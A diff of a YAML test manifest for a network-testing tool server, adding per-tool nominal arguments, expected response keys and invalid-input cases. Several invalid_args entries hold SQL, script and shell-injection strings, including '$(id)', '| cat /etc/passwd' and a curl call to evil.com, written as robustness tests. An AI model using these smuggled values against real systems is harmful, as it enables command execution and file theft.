@@ -3,332 +3,942 @@
 # category: read | write | destructive
 # timeout_class: fast (<10s) | medium (<60s) | long (<120s)
 # size_budget_kb: max response size in KB
+# scope: node | mesh | vyos | prisma | cloud
+# min_node_version: minimum Stigix node version required
+# nominal_args: arguments for happy-path nominal testing
+# expected_keys: at least one of these must be present in nominal response
+# invalid_args: list of bad arg sets (injection strings, wrong types) for robustness testing
+# skip_nominal: if true, skip the nominal test (state-dependent or known orchestrator bug)
+# skip_reason: human-readable explanation for skip_nominal
 
 tools:
   add_dem_probe:
     category: write
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+      name: "Test Probe"
+      target: "https://example.com"
+      probe_type: "HTTP"
+    expected_keys: [success, probe, targets]
+    invalid_args:
+      - agent_id: mock-primary
+        name: "'; DROP TABLE probes; --"
+        target: "https://example.com"
+        probe_type: HTTP
+      - agent_id: mock-primary
+        name: "Test"
+        target: "javascript:alert(1)"
+        probe_type: HTTP
+
   add_fabric_target:
     category: write
+    scope: mesh
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+      name: "Branch-Test"
+      host: "192.0.2.1"
+    expected_keys: [success, targets]
+
   add_tcp_app_peer:
     category: write
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+      app_id: "app-test"
+      peer_name_or_host: "mock-canary"
+    expected_keys: [success, app]
+
   clone_node_config:
     category: write
+    scope: mesh
+    min_node_version: "2.0.0"
     size_budget_kb: 50
     timeout_class: long
+    nominal_args:
+      source_id: mock-primary
+      target_id: mock-canary
+    expected_keys: [source, target, components]
+
   compare_nodes:
     category: read
+    scope: mesh
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id_a: mock-primary
+      agent_id_b: mock-canary
+    expected_keys: [nodes, diff]
+
   create_custom_tcp_app:
     category: write
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: medium
+    nominal_args:
+      agent_id: mock-primary
+      name: "app-test"
+      port: 19200
+    expected_keys: [success, app]
+
   delete_custom_tcp_app:
     category: write
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+      app_id: "app-test"
+    expected_keys: [success]
+
   export_app_config:
     category: read
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+    expected_keys: [success, config]
+
   generate_peer_onboard_command:
     category: read
+    scope: mesh
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+    expected_keys: [success, command, curl_command]
+
   generate_report:
     category: read
+    scope: mesh
+    min_node_version: "2.0.0"
     size_budget_kb: 50
     timeout_class: long
+    nominal_args: {}
+    expected_keys: [nodes, summary]
+
   get_app_score:
     category: read
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    # app_name must match an entry in _DASHBOARD_DATA.stats.requests_by_app
+    nominal_args:
+      agent_id: mock-primary
+      app_name: "teams"
+    expected_keys: [agent, app, success_rate, status]
+
   get_controller_status:
     category: read
+    scope: mesh
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+    # orchestrator wraps the raw response; returns {success, status, local_instances}
+    expected_keys: [success, status]
+
   get_convergence_history:
     category: read
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+    expected_keys: [success, history]
+
   get_dem_probe_stats:
     category: read
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+    # orchestrator wraps stats in {agent_id, time_range, global_stats: {...}}
+    expected_keys: [agent_id, global_stats]
+    invalid_args:
+      - agent_id: "mock-primary; id"
+      - agent_id: "$(id)"
+      - agent_id: "`id`"
+
   get_dem_summary:
     category: read
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+    expected_keys: [globalHealth, probeCount]
+
   get_diagnostics:
     category: read
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+    # get_diagnostics calls get_agent_dashboard → returns {stats, version, uptime}
+    expected_keys: [stats, version]
+
   get_health_matrix:
     category: read
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+    expected_keys: [success, matrix, score]
+
   get_node_status:
     category: read
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+    # orchestrator aggregates multiple sub-calls into {agent_id, base_url, health, version, ...}
+    expected_keys: [agent_id, health]
+
   get_prisma_flows:
     category: read
+    scope: prisma
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: medium
+    nominal_args:
+      agent_id: mock-primary
+      site_name: "mock-site"
+    expected_keys: [success, flows]
+
   get_probe_details:
     category: read
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    # probe_name must match an existing probe returned by the mock's connectivity/custom endpoint
+    nominal_args:
+      agent_id: mock-primary
+      probe_name: "MS - Azure Portal"
+    # orchestrator returns the raw probe result dict (endpointId, probe_name, samples_count, ...)
+    expected_keys: [endpointId, probe_name]
+    invalid_args:
+      - agent_id: mock-primary
+        probe_name: "'; DROP TABLE probes; --"
+      - agent_id: mock-primary
+        probe_name: "<script>alert(1)</script>"
+
   get_provisioning_history:
     category: read
+    scope: mesh
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+    expected_keys: [success, history]
+
   get_provisioning_status:
     category: read
+    scope: mesh
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+    expected_keys: [success, provisioning_enabled]
+
   get_public_ip:
     category: read
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+    expected_keys: [public_ip]
+
   get_security_config:
     category: read
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+    # orchestrator returns {config: {...}, profile: {...}}
+    expected_keys: [config, profile]
+
   get_security_results_stats:
     category: read
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+    # orchestrator returns {agent_id, posture_scores, score_trend}
+    expected_keys: [agent_id, posture_scores]
+
   get_security_test_options:
     category: read
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+      probe_type: "dns"
+    # orchestrator returns {agent_id, probe_type, options}
+    expected_keys: [agent_id, options]
+
   get_security_test_options_dynamic:
     category: read
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+      probe_type: "url"
+    expected_keys: [agent_id, options]
+
   get_tcp_app_sessions:
     category: read
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+      app_id: "app-test"
+    expected_keys: [success, apps]
+
   get_test_status:
     category: read
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    # Requires a running test to exist — ephemeral in-memory state; skip nominal test
+    skip_nominal: true
+    skip_reason: "Requires a running test (ephemeral in-memory state). Run run_test first to get a test_id."
+    nominal_args:
+      test_id: "G-TEST-0001"
+    expected_keys: [success, status]
+
   get_traffic_logs:
     category: read
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+    expected_keys: [success, logs]
+
   get_traffic_stats:
     category: read
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+    expected_keys: [success, enabled, stats]
+
   get_voice_ingress_calls:
     category: read
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+    expected_keys: [success, calls]
+
   get_voice_stats:
     category: read
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+    expected_keys: [success, enabled, stats]
+
   get_vyos_interfaces:
     category: read
+    scope: vyos
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+    # orchestrator returns {routers: [{router_id, router_name, interfaces: [...]}]}
+    expected_keys: [routers]
+
   get_vyos_router_state:
     category: read
+    scope: vyos
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+      router_id: "vyosrouter"
+    # orchestrator returns {router_id, interfaces: [{name, admin_state, qos, blackhole_ips}]}
+    expected_keys: [router_id, interfaces]
+
   get_vyos_timeline:
     category: read
+    scope: vyos
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+    # orchestrator wraps response as {history: {success, routers, scenarios, timeline}}
+    expected_keys: [history]
+
   import_app_config:
     category: write
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+      config: {}
+    expected_keys: [success]
+
   list_active_impairments:
     category: read
+    scope: vyos
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args: {}
+    expected_keys: [success, impairments]
+
   list_apps:
     category: read
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+    # orchestrator returns {agent_id, count, apps}
+    expected_keys: [agent_id, apps]
+
   list_controller_peers:
     category: read
+    scope: mesh
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+    # orchestrator returns {is_leader, site_name, peer_count, peers}
+    expected_keys: [peers]
+
   list_custom_tcp_apps:
     category: read
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+    expected_keys: [success, apps]
+
   list_dem_probes:
     category: read
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+    # orchestrator returns {agent_id, count, probes}
+    expected_keys: [agent_id, probes]
+
   list_endpoints:
     category: read
+    scope: mesh
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args: {}
+    expected_keys: [endpoints]
+
   list_fabric_targets:
     category: read
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+    expected_keys: [success, targets]
+
   list_security_results:
     category: read
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+    expected_keys: [success, results]
+
   list_speedtest_history:
     category: read
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+    # orchestrator returns {agent_id, count, jobs}
+    expected_keys: [agent_id, jobs]
+
   list_vyos_routers:
     category: read
+    scope: vyos
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+    expected_keys: [success, routers, scenarios, timeline]
+
   list_vyos_scenarios:
     category: read
+    scope: vyos
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+    expected_keys: [success, routers, scenarios, timeline]
+
   publish_configuration_bundle:
     category: destructive
     safe_defaults: true
+    scope: mesh
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: medium
+    nominal_args:
+      agent_id: mock-primary
+      bundle_type: "connectivity-probes"
+    expected_keys: [success, published]
+
   purge_stale_leader_state:
     category: destructive
     safe_defaults: true
+    scope: mesh
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: medium
+    nominal_args:
+      agent_id: mock-primary
+      dry_run: true
+    expected_keys: [success, dry_run, to_delete, message, result]
+
   remove_dem_probe:
     category: write
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    # probe_name must match an existing probe in the mock (MS - Azure Portal or Google DNS)
+    nominal_args:
+      agent_id: mock-primary
+      probe_name: "MS - Azure Portal"
+    expected_keys: [success]
+
   remove_fabric_target:
     category: write
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    # target must be one of the registered peers (mock-primary or mock-canary)
+    nominal_args:
+      agent_id: mock-primary
+      target_name_or_host: "mock-canary"
+    expected_keys: [success]
+
   reset_tcp_app_metrics:
     category: write
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+      app_id: "app-test"
+    expected_keys: [success]
+
   rollback_configuration_bundle:
     category: destructive
     safe_defaults: true
+    scope: mesh
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: medium
+    nominal_args:
+      agent_id: mock-primary
+      bundle_type: "connectivity-probes"
+      revision: "abc123"
+    expected_keys: [success, message]
+
   run_dem_probes_now:
     category: write
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 50
     timeout_class: long
+    nominal_args:
+      agent_id: mock-primary
+    expected_keys: [success, results]
+
   run_eicar_test:
     category: write
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: medium
+    nominal_args:
+      agent_id: mock-primary
+    expected_keys: [success, results]
+
   run_full_security_audit:
     category: write
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 50
     timeout_class: long
+    nominal_args:
+      agent_id: mock-primary
+    # orchestrator returns {agent_id, phases, summary}
+    expected_keys: [agent_id, phases]
+
   run_path_trace:
     category: read
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: medium
+    nominal_args:
+      agent_id: mock-primary
+      target: "1.1.1.1"
+    expected_keys: [success, target]
+    invalid_args:
+      - agent_id: mock-primary
+        target: "1.1.1.1; id"
+      - agent_id: mock-primary
+        target: "$(id)"
+      - agent_id: mock-primary
+        target: "`id`"
+      - agent_id: mock-primary
+        target: "| cat /etc/passwd"
+      - agent_id: mock-primary
+        target: "1.1.1.1 && curl http://evil.com"
+
   run_security_dns_batch:
     category: write
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 50
     timeout_class: long
+    nominal_args:
+      agent_id: mock-primary
+    # orchestrator returns {agent_id, total, blocked, allowed, unknown, results}
+    expected_keys: [agent_id, total, results]
+
   run_security_probe:
     category: write
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: medium
+    nominal_args:
+      agent_id: mock-primary
+      probe_type: "dns"
+      target: "malware.test.domain"
+    expected_keys: [success, results]
+    invalid_args:
+      - agent_id: mock-primary
+        probe_type: dns
+        target: "'; DROP TABLE domains; --"
+      - agent_id: mock-primary
+        probe_type: url
+        target: "javascript:void(0)"
+
   run_security_url_batch:
     category: write
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 50
     timeout_class: long
+    nominal_args:
+      agent_id: mock-primary
+    # orchestrator returns {agent_id, total, blocked, allowed, unknown, results}
+    expected_keys: [agent_id, total, results]
+
   run_system_diagnostics:
     category: read
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 50
     timeout_class: long
+    nominal_args:
+      agent_id: mock-primary
+    expected_keys: [success, diagnostics]
+
   run_test:
     category: write
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 50
     timeout_class: long
+    nominal_args:
+      source_id: mock-primary
+      target_id: mock-canary
+      profile: "CONV-001"
+    expected_keys: [tests]
+
   run_vyos_scenario:
     category: write
+    scope: vyos
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: medium
+    nominal_args:
+      agent_id: mock-primary
+      scenario_id: "test-scenario"
+    expected_keys: [success, routers, scenarios, timeline]
+
   set_controller_leader:
     category: write
+    scope: mesh
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+    expected_keys: [success]
+
   set_fabric_target_enabled:
     category: write
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    # target must be one of the registered peers (mock-primary or mock-canary)
+    nominal_args:
+      agent_id: mock-primary
+      target_name_or_host: "mock-canary"
+      enabled: true
+    expected_keys: [success]
+
   set_provisioning_mode:
     category: write
+    scope: mesh
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+      enabled: true
+    expected_keys: [success, provisioning_enabled]
+
   set_traffic_client_count:
     category: write
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+      client_count: 2
+    expected_keys: [success, client_count]
+
   set_traffic_rate:
     category: write
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+      rate: 1.0
+    expected_keys: [success, rate]
+
   set_traffic_status:
     category: write
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      source_id: mock-primary
+      enabled: false
+    expected_keys: [success, enabled]
+
   set_voice_status:
     category: write
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      source_id: mock-primary
+      enabled: false
+    expected_keys: [success, enabled]
+
   set_vyos_scenario_status:
     category: write
+    scope: vyos
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    # scenario_id must match a sequence id in the mock's vyos/sequences list
+    nominal_args:
+      agent_id: mock-primary
+      scenario_id: "test-scenario"
+      enabled: false
+    expected_keys: [success]
+
   start_tcp_app_listener:
     category: write
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+      app_id: "app-test"
+    expected_keys: [success]
+
   start_tcp_app_workload:
     category: write
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: medium
+    nominal_args:
+      agent_id: mock-primary
+      app_id: "app-test"
+    expected_keys: [success]
+
   stop_tcp_app_listener:
     category: write
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+      app_id: "app-test"
+    expected_keys: [success]
+
   stop_tcp_app_workload:
     category: write
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    nominal_args:
+      agent_id: mock-primary
+      app_id: "app-test"
+    expected_keys: [success]
+
   stop_test:
     category: write
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: medium
+    # Requires a running test to exist — ephemeral in-memory state; skip nominal test
+    skip_nominal: true
+    skip_reason: "Requires a running test (ephemeral in-memory state). Call run_test first to get a test_id."
+    nominal_args:
+      test_id: "G-TEST-0001"
+    expected_keys: [success, status]
+
   test_tcp_app_handshake:
     category: write
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: medium
+    nominal_args:
+      agent_id: mock-primary
+      app_id: "app-test"
+    expected_keys: [success, apps]
+
   update_dem_probe:
     category: write
+    scope: node
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: fast
+    # probe_name must match an existing probe in the mock (MS - Azure Portal or Google DNS)
+    nominal_args:
+      agent_id: mock-primary
+      probe_name: "MS - Azure Portal"
+      enabled: true
+    expected_keys: [success]
+
   vyos_bulk_reset:
     category: write
+    scope: vyos
+    min_node_version: "2.0.0"
     size_budget_kb: 50
     timeout_class: long
+    nominal_args:
+      agent_id: mock-primary
+      router_id: "vyosrouter"
+      scope: "all-qos"
+    expected_keys: [success, scope, actions_taken]
+
   vyos_execute_action:
     category: write
+    scope: vyos
+    min_node_version: "2.0.0"
     size_budget_kb: 20
     timeout_class: medium
+    nominal_args:
+      agent_id: mock-primary
+      router_id: "vyosrouter"
+      command: "show-denied"
+    # orchestrator calls an ad-hoc sequence; returns {success, command, output} or {error, ...}
+    expected_keys: [success, command]
